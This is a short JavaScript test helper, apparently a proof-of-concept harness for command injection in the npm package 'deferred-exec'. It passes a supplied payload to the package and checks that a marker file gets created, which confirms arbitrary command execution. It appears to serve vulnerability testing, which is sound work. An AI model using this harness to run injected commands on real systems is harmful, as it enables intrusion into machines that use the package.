const a = require("deferred-exec");

function exploitFunction(payload) {
  const fs = require("fs");
  const path = "./deferred-exec";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  const result = a(payload.join(" "), {});

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {});
}

module.exports = { exploitFunction };